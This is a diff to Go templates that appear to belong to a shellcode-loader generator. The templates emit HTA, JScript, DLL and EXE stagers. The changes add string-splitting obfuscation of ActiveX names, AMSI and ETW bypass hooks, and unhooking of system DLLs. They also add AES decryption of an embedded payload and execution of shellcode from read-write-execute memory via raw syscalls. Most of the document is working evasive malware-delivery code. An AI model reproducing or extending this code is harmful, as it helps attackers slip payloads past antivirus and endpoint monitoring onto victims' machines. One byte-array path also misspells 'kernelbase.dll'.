@@ -29,7 +29,7 @@ func JS_Office_Export() string {
 	return `
 	//export xlAutoOpen
 	func xlAutoOpen() {
-		Start()
+		Run()
 	}`
 }
 
@@ -37,7 +37,7 @@ func JS_Control_Export() string {
 	return `
 	//export CPlApplet
 	func CPlApplet() {
-		Start()
+		Run()
 	}`
 }
 
@@ -45,17 +45,17 @@ func WS_JS_Export() string {
 	return `
 	//export DllRegisterServer
 	func DllRegisterServer() {
-		Start()
+		Run()
 	}
 	
 	//export DllGetClassObject
 	func DllGetClassObject() {
-		Start()
+		Run()
 	}
 	
 	//export DllUnregisterServer
 	func DllUnregisterServer() {
-		Start()
+		Run()
 	}`
 }
 
@@ -78,12 +78,27 @@ func HTA() string {
 	<BODY>
 	<script language="javascript" >
 	window.resizeTo(0,0);
+	{{.Variables.payload}}
+	window.close();
+	</script>
+	</BODY>
+	</HTML>
+`
+}
+
+func HTA_WScript() string {
+	return `<HTML>
+	<HEAD>
+	</HEAD>
+	<BODY>
+	<script language="javascript" >
+	window.resizeTo(0,0);
 	try {
 		var {{.Variables.RNZyt}} = window.document.location.pathname;
-		var {{.Variables.fos}} = new ActiveXObject("Scripting.FileSystemObject");
+		var {{.Variables.fos}} = new ActiveXObject("Scri"+"pting.FileSy"+"stemObject");
 		var {{.Variables.bogusWindows1252Chars}} = "\u20AC\u201A\u0192\u201E\u2026\u2020\u2021\u02C6\u2030\u0160\u2039\u0152\u017D\u2018\u2019\u201C\u201D\u2022\u2013\u2014\u02DC\u2122\u0161\u203A\u0153\u017E\u0178";
 		var {{.Variables.correctLatin1Chars}} = "\u0080\u0082\u0083\u0084\u0085\u0086\u0087\u0088\u0089\u008A\u008B\u008C\u008E\u0091\u0092\u0093\u0094\u0095\u0096\u0097\u0098\u0099\u009A\u009B\u009C\u009E\u009F";
-		var {{.Variables.obshell}} = new ActiveXObject("Shell.Application");
+		var {{.Variables.obshell}} = new ActiveXObject("Sh"+"ell.App"+"lication");
 		var {{.Variables.pathworks}} = new ActiveXObject("Wscri"+"pt.shell");
 		var {{.Variables.dest}} = {{.Variables.pathworks}}.ExpandEnvironmentStrings("%TEMP%") + "\\{{.Variables.filename}}";
 	 
@@ -138,7 +153,7 @@ func HTA() string {
 		}
 		
 		{{.Variables.decode}}();
-		{{.Variables.obshell}}.ShellExecute(""+{{.Variables.dest}}+"","","","",0);
+		{{.Variables.obshell}}.ShellExecute("C:\\Windows\\Sysnative\\wscript.exe",""+{{.Variables.dest}}+"","","",0);
 		}
 		catch (err){
 			}
@@ -152,7 +167,7 @@ func HTA() string {
 func JS_Office_Sub() string {
 	return `
 
-	var {{.Variables.fso}} = new ActiveXObject("Scripting.FileSystemObject");
+	var {{.Variables.fso}} = new ActiveXObject("Scrip"+"ting.FileS"+"ystemObject");
 	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);
 	var {{.Variables.objapp}} = new ActiveXObject("{{.Variables.RegName}}.Application");
 	{{.Variables.objapp}}.Visible = false;
@@ -163,7 +178,7 @@ func JS_Office_Sub() string {
 	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}},{{.Variables.value}}, "REG_SZ");
 	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
     {{.Variables.objShell}}.ShellExecute("{{.Variables.ApplicationName}}", "", "", "open", 0);
-	WScript.Sleep(20000);
+	WScript.Sleep(40000);
 	
 	{{.Variables.WshShell}}.RegDelete({{.Variables.strRegPath}});
 	{{.Variables.WshShell}}.RegDelete("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Resiliency\\StartupItems\\");
@@ -173,15 +188,15 @@ func JS_Office_Sub() string {
 
 func JS_Control_Sub() string {
 	return `
-	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
+	var {{.Variables.objShell}} = new ActiveXObject("sh"+"ell.applic"+"ation");     
     {{.Variables.objShell}}.ShellExecute({{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", "", 1);
 	`
 }
 
 func JS_Msiexec_Sub() string {
 	return `
-	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
-    {{.Variables.objShell}}.ShellExecute("msiexec", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
+	var {{.Variables.objShell}} = new ActiveXObject("she"+"ll.appl"+"ication");     
+    {{.Variables.objShell}}.ShellExecute("C:\\Windows\\Sysnative\\msiexec.exe", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
 	`
 }
 
@@ -190,13 +205,13 @@ func JSfile() string {
 	try {
 	
 
-	var {{.Variables.fso}} = new ActiveXObject("Scripting.FileSystemObject");
+	var {{.Variables.fso}} = new ActiveXObject("Scripti"+"ng.FileSys"+"temObject");
 	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);
 
     var {{.Variables.base6411}}={ {{.Variables.characters}}:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function({{.Variables.atest}}){ {{.Variables.base6411}}.{{.Variables.characters}};var {{.Variables.rtest}}="",{{.Variables.ctest}}=0;do{var {{.Variables.etest}}={{.Variables.atest}}.charCodeAt({{.Variables.ctest}}++),{{.Variables.ttest}}={{.Variables.atest}}.charCodeAt(c++),{{.Variables.htest}}=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,{{.Variables.rtest}}+={{.Variables.base6411}}.{{.Variables.characters}}.charAt(s)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(A)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(o)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(B)}while(c<a.length);return {{.Variables.rtest}}}};
-    function Magic1({{.Variables.rtest}}){if(!/^[a-z0-9+/]+={0,2}$/i.test({{.Variables.rtest}})||{{.Variables.rtest}}.length%4!=0)throw Error("Not {{.Variables.base6411}} string");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<{{.Variables.rtest}}.length;d+=4)t=(a=f.indexOf({{.Variables.rtest}}.charAt(d))<<18|f.indexOf({{.Variables.rtest}}.charAt(d+1))<<12|(o=f.indexOf({{.Variables.rtest}}.charAt(d+2)))<<6|(i=f.indexOf({{.Variables.rtest}}.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return {{.Variables.rtest}}=h.join("")}
+    function {{.Variables.Magic1}}({{.Variables.rtest}}){if(!/^[a-z0-9+/]+={0,2}$/i.test({{.Variables.rtest}})||{{.Variables.rtest}}.length%4!=0)throw Error("failed");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<{{.Variables.rtest}}.length;d+=4)t=(a=f.indexOf({{.Variables.rtest}}.charAt(d))<<18|f.indexOf({{.Variables.rtest}}.charAt(d+1))<<12|(o=f.indexOf({{.Variables.rtest}}.charAt(d+2)))<<6|(i=f.indexOf({{.Variables.rtest}}.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return {{.Variables.rtest}}=h.join("")}
     function {{.Variables.binaryWriter}}({{.Variables.res1}},{{.Variables.filename1}})
-    {var {{.Variables.base6411}}decoded=Magic1({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('ADODB.Stream');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('ADODB.Stream');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}
+    {var {{.Variables.base6411}}decoded={{.Variables.Magic1}}({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('A'+'D'+'O'+'D'+'B'+'.'+'S'+'t'+'r'+'e'+'a'+'m');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('A'+'D'+'O'+'D'+'B'+'.'+'S'+'t'+'r'+'e'+'a'+'m');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}
 
     {{.Variables.dll}}
    
@@ -263,6 +278,39 @@ func WS_JS() string {
 `
 }
 
+func Decrypt_Function() string {
+	return `
+func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
+		{{.Variables.length}} := len({{.Variables.src}})
+		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
+		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
+	}
+
+func {{.Variables.FuncName}}() []byte {	
+	{{.Variables.ciphertext}}
+	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
+
+	{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
+	{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
+
+	{{.Variables.block}}, _ := aes.NewCipher({{.Variables.vkey}})
+
+	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
+	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
+	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
+	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
+
+	{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
+	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
+	{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
+	return {{.Variables.raw_bin}}
+}
+
+
+
+`
+}
+
 func DLL_Refresher() string {
 	return `
 	package main
@@ -270,34 +318,33 @@ func DLL_Refresher() string {
 	import "C"
 
 	import (
-		"crypto/aes"
-		"crypto/cipher"
 		"debug/pe"
+		{{.Variables.HEX_Import}}
 		"encoding/base64"
-		"encoding/hex"
 		"[loader]/[loader]"
-		"os"
 		"io/ioutil"
 		"strconv"
 		"syscall"
 		"unsafe"
-
+		{{.Variables.SandboxOS}}
+		
 		"golang.org/x/sys/windows"
 		"golang.org/x/sys/windows/registry"
 	
 	)
 
-	var  (
+
+	const (
+		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
+	)
+	var _ unsafe.Pointer
+	var (
 		{{.Variables.customsyscall}} uint16
 		{{.Variables.customsyscallVP}} uint16
 		{{.Variables.number}} int = {{.Variables.b64number}}
 	)
 
-	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
-		{{.Variables.length}} := len({{.Variables.src}})
-		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
-		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
-	}
+
 	
 	{{.Variables.Sandboxfunction}}
 	
@@ -316,32 +363,23 @@ func DLL_Refresher() string {
 	
 		
 	func {{.Variables.loader}}()  {
-		err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
+		err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
 		if err != nil {
 		}
-		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
 		if err != nil {
 		}
-		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 		if err != nil {
 		}
 	
 	}
-	
 
-	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
-		var {{.Variables.decoded}} []byte
-			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
-		{{.Variables.sum}} := 1
-		for i := 1; i < {{.Variables.number}}; i++ {
-			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
-			{{.Variables.sum}} += i
-		}
-		return string({{.Variables.decoded}})
-	
-	}
+	{{.Variables.WriteProcessMemory_Function}}
 
 	{{.Variables.ETW_Function}}
+
+	{{.Variables.AMSI_Function}}
 
 	func main() {
 	}
@@ -349,42 +387,17 @@ func DLL_Refresher() string {
 	{{.Variables.ExportName}}
 
 
-	//export Start
-	func Start() {
+	//export Run
+	func Run() {
 		{{.Variables.Sandbox}}
 		{{.Variables.ETW}}
+		{{.Variables.AMSI}}
 		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.loader}}()
 		}
-		{{.Variables.ETW}}
-		{{.Variables.ciphertext}}
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
-
-		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
-		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
-	
-		{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
-		if err != nil {
-			return
-		}
-	
-	
-		if len({{.Variables.vciphertext}}) < aes.BlockSize {
-			return
-		}
-	
-		{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
-		{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
-		{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
-		{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
-	
-		{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
-		{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
-		{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
-		os.Stdout, _ = os.Open(os.DevNull)
-	
-
+		{{.Variables.ETW}}	
+		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 		var {{.Variables.phandle}} uint64
 		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
 		{{.Variables.phandle}} = 0xffffffffffffffff
@@ -397,23 +410,10 @@ func DLL_Refresher() string {
 		for x, y := range []byte({{.Variables.raw_bin}}) {
 			{{.Variables.buff}} [x] = y
 		}
-
-		var {{.Variables.oldfartcodeperms}} uintptr
-
-		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
-			{{.Variables.customsyscallVP}}, 
-			uintptr({{.Variables.phandle}}),
-			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
-			&{{.Variables.regionsize}},
-			syscall.PAGE_EXECUTE_READ,
-			&{{.Variables.oldfartcodeperms}},
-		)
-		if {{.Variables.runfunc}} != 0 {
-		}
-
-
-		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0)
+		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0,)
+	
 	}
+
 	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
@@ -423,7 +423,7 @@ func DLL_Refresher() string {
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
-		{{.Variables.x}} := {{.Variables.file}}.Section(".text")
+		{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
 		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
 		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
@@ -432,53 +432,35 @@ func DLL_Refresher() string {
 		{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
 		{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
 		{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
-		var {{.Variables.oldfartcodeperms}} uintptr
 		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
+		var {{.Variables.oldfartcodeperms}} uintptr
+
+		[loader].[NtProtectVirtualMemoryprep](
 			{{.Variables.customsyscallVP}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
 			&{{.Variables.regionsize}},
-			syscall.PAGE_EXECUTE_READWRITE,
+			0x40,
 			&{{.Variables.oldfartcodeperms}},
 		)
-		if {{.Variables.runfunc}} != 0 {
-		}
 
 		for i := 0; i < len({{.Variables.bytes}}); i++ {
 			{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
 			{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
 			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 		}
-
-		{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
+		[loader].[NtProtectVirtualMemoryprep](
 			{{.Variables.customsyscallVP}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
 			&{{.Variables.regionsize}},
-			{{.Variables.oldfartcodeperms}},
+			0x20,
 			&{{.Variables.oldfartcodeperms}},
 		)
-		if {{.Variables.runfunc}} != 0 {
-		}
-
 		return nil
 	}
-	func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
-
-		return [loader].[NtProtectVirtualMemory](
-			{{.Variables.sysid}},
-			{{.Variables.processHandle}},
-			uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
-			uintptr(unsafe.Pointer({{.Variables.regionSize}})),
-			{{.Variables.NewProtect}},
-			uintptr(unsafe.Pointer({{.Variables.oldprotect}})),
-		)
-	}
 	
-
-
 `
 }
 
@@ -486,16 +468,12 @@ func Binary() string {
 	return `
 	package main
 
-	import "C"
-
 	import (
-		"crypto/aes"
-		"crypto/cipher"
 		"debug/pe"
 		"encoding/base64"
-		"encoding/hex"
 		"time"
 		"[loader]/[loader]"
+		{{.Variables.HEX_Import}}
 		{{.Variables.DebugImport}}
 		"io/ioutil"
 		"syscall"
@@ -515,38 +493,30 @@ func Binary() string {
 		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
 	)
 	var _ unsafe.Pointer
-	const (
-		{{.Variables.errnoERROR_IO_PENDING}}= 997
-	)
 	var (
-		{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
+
 		{{.Variables.customsyscall}} uint16
+		{{.Variables.customsyscallVP}} uint16
 		{{.Variables.number}} int = {{.Variables.b64number}}
 	)
 
-
+	
 	{{.Variables.Sandboxfunction}}
 
-	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
-		{{.Variables.length}} := len({{.Variables.src}})
-		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
-		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
-	}
-	
 
 	func {{.Variables.Console}}(show bool) {
-		{{.Variables.getWin}} := syscall.NewLazyDLL("kernel32.dll").NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
-		{{.Variables.showWin}} := syscall.NewLazyDLL("user32.dll").NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
+		{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
+		{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
 		{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
 		if {{.Variables.hwnd}} == 0 {
-				return
+			return
 		}
 		if show {
-		   var {{.Variables.SW_RESTORE}} uintptr = 9
-		   {{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
+		var {{.Variables.SW_RESTORE}} uintptr = 9
+		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
 		} else {
-		   var {{.Variables.SW_HIDE}} uintptr = 0
-		   {{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
+		var {{.Variables.SW_HIDE}} uintptr = 0
+		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
 		}
 	}
 	
@@ -564,28 +534,22 @@ func Binary() string {
 
 	}
 
+	{{.Variables.WriteProcessMemory_Function}}
+
 	{{.Variables.ETW_Function}}
 
-	func errnoErr(e syscall.Errno) error {
-		switch e {
-		case 0:
-			return nil
-		case {{.Variables.errnoERROR_IO_PENDING}}:
-			return {{.Variables.errERROR_IO_PENDING}}
-		}
-		return e
-	}
+	{{.Variables.AMSI_Function}}
 	
 	func {{.Variables.loader}}()  {
-		err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
+		err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
-		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
-		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
@@ -593,22 +557,11 @@ func Binary() string {
 	
 	}
 	
-
-	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
-		var {{.Variables.decoded}} []byte
-			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
-		{{.Variables.sum}} := 1
-		for i := 1; i < {{.Variables.number}}; i++ {
-			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
-			{{.Variables.sum}} += i
-		}
-		return string({{.Variables.decoded}})
-	
-	}
 	
 	func main() {
 		{{.Variables.Sandbox}}
 		{{.Variables.ETW}}
+		{{.Variables.AMSI}}
 		time.Sleep({{.Variables.SleepSecond}} * time.Millisecond)
 		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 		if {{.Variables.Version}} == "10.0" {
@@ -617,68 +570,21 @@ func Binary() string {
 		{{.Variables.ETW}}
 		{{.Variables.hide}}
 		{{.Variables.Pointer}}
-		{{.Variables.ptr}} := func() {
-		}
-		{{.Variables.ciphertext}}
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
-		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
-		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
-	
-		{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
-		if err != nil {
-			return
-		}
-	
-	
-		if len({{.Variables.vciphertext}}) < aes.BlockSize {
-			return
-		}
-	
-		{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
-		{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
-		{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
-		{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
-	
-		{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
-		{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
-		{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
+		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 		{{.Variables.ShellcodeString}}
-
-		var {{.Variables.oldptrperms}} uintptr
-		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
-		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
-	
-		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
-			{{.Variables.customsyscall}}, 
-			{{.Variables.handle}},
-			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
-			&{{.Variables.regionsize}},
-			syscall.PAGE_EXECUTE_READWRITE,
-			&{{.Variables.oldptrperms}},
-		)
-		if {{.Variables.runfunc}} != 0 {
+		var {{.Variables.phandle}} uint64
+		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
+		{{.Variables.phandle}} = 0xffffffffffffffff
+		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
+		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
+		{{.Variables.protect}} = 0x40
+		{{.Variables.alloctype}} = 0x3000
+		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
+		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
+		for x, y := range []byte({{.Variables.raw_bin}}) {
+			{{.Variables.buff}} [x] = y
 		}
-		{{.Variables.CopyPointer}}
-
-		*(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})) = (*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}))
-
-		{{.Variables.OverwrittenShellcode}}
-		var {{.Variables.oldfartcodeperms}} uintptr
-	
-		{{.Variables.OverWrittenPoint}}
-
-		{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
-			{{.Variables.customsyscall}}, 
-			{{.Variables.handle}},
-			(*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}})),
-			&{{.Variables.regionsize}},
-			syscall.PAGE_EXECUTE_READWRITE,
-			&{{.Variables.oldfartcodeperms}},
-		)
-		if {{.Variables.runfunc}} != 0 {
-		}
-
-		syscall.Syscall(**(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),0, 0, 0, 0,)
+		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0,)
 	
 	}
 	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
@@ -691,7 +597,7 @@ func Binary() string {
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
-		{{.Variables.x}} := {{.Variables.file}}.Section(".text")
+		{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
 		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
 		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
